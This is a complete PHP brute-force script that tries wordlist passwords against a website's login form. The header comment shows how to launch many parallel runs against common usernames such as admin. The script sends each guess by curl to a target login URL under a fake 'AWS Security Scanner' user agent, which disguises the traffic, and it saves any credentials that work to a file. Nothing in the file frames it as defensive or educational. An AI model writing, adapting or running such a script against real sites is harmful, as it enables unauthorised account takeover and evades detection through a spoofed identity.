<?php
/*
parameter user anda words
php  brute.php user dictionary
example multi thread:
php brute.php admin a & \
php brute.php admin b & \
php brute.php admin c & \
php brute.php admin d & \
php brute.php admin e & \
php brute.php admin f & \
php brute.php adminstrator a & \
php brute.php adminstrator b & \
php brute.php adminstrator c & \
php brute.php adminstrator d & \
php brute.php adminstrator e & \
php brute.php adminstrator f & \
php brute.php user a & \
php brute.php user b & \
php brute.php user c & \
php brute.php user d & \
php brute.php user e & \
php brute.php user f

*/
$user = $argv[1];
$path = "./words/".$argv[2].".lst";

$n = 1;
$a = "1";
for($n=1;$n<10;$n++){
    login($user,$a);
    $a = $a.$n;
}
$isi = file_get_contents($path);
$pass = explode("\n",str_replace("\r","",$isi ));
shuffle($pass);
foreach($pass as $pas){
    login($user,$pas);
}


function login($user,$pass){
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL,"http://target.com/login-action");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT,"AWS Security Scanner");
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array('user' => $user,'passwd' => $pass)));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close ($ch);

    if(strpos($result,'Location: http://gatotkaca77.com/login')===false){
        echo "\n\n$user:$pass\n\n";
        file_put_contents("sukses.txt","$result\n\n$user:$pass\n\n",FILE_APPEND);
    }else{
        echo substr($result,0,12)."  $user:$pass \n";
        return false;
    }
}